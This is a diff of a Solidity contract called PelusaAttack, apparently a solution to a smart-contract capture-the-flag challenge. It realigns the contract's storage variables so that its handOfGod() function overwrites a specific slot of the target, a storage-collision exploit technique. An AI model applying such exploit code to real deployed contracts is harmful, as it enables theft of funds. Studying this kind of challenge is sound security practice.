@@ -4,8 +4,8 @@ pragma solidity ^0.8.7;
 import {Create2} from "openzeppelin-contracts/utils/Create2.sol";
 
 contract PelusaAttack {
+    uint256 public slotZero;
     uint256 public slotOne;
-    uint256 public slotTwo;
 
     address public admin;
 
@@ -23,7 +23,7 @@ contract PelusaAttack {
     }
 
     function handOfGod() external returns (uint256) {
-        slotTwo = 2;
+        slotOne = 2;
         return 22_06_1986;
     }
 
